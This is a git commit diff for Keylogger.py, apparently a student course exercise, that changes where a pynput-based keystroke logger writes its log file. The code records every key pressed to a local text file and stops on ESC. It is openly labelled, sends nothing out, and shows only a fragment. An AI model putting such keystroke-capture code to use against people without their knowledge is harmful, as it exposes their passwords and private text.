705181e9de64d6fff448388cb5b5180cbf7e3a1d
Ftm.amazing <123885130+Mikaxial@users.noreply.github.com>
2024-09-22 19:41:06 +0400

    Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,13 +1,15 @@
+import os
 from pynput.keyboard import Listener, Key
 
 # File to store logged keys
-log_file = "key_log.txt"
+log_directory = "C:/Users/MIS/Downloads/Course/Prodigy Tech/logs" 
+log_file = os.path.join(log_directory, "key_log.txt")
 
 def on_press(key):
     # Stop the keylogger if ESC is pressed
     if key == Key.esc:
         print("ESC key pressed. Stopping the keylogger...")
-        return False  # Returning False stops the listener
+        return False  
 
     # Log the key pressed
     with open(log_file, "a") as file:
